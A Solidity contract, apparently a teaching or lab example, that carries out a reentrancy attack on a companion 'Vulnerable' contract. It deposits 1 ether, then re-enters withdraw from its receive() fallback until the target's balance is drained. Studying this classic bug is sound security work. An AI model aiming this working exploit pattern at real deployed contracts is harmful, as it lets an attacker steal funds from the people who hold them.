// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <0.9.0;

import "./Vulnerable.sol";

contract reentrancy{
    Vulnerable public vulnerable;//object creation

    //obj allows us to use vulnerable functions
    constructor(address vulnerableaddress){
        vulnerable = Vulnerable(vulnerableaddress); //typecast
    }

    //hacker first gives some ether and then withdraw it to be the part of the transaction
    function attack() external  payable {
        vulnerable.deposit{value:1 ether}();
        vulnerable.withdraw();
    }

    function callercheck() public view returns(address){
        return vulnerable.callerAddress();
    }

    receive() external payable {
        if(address(vulnerable).balance >= 1 ether){
            vulnerable.withdraw();
        }
    }
}
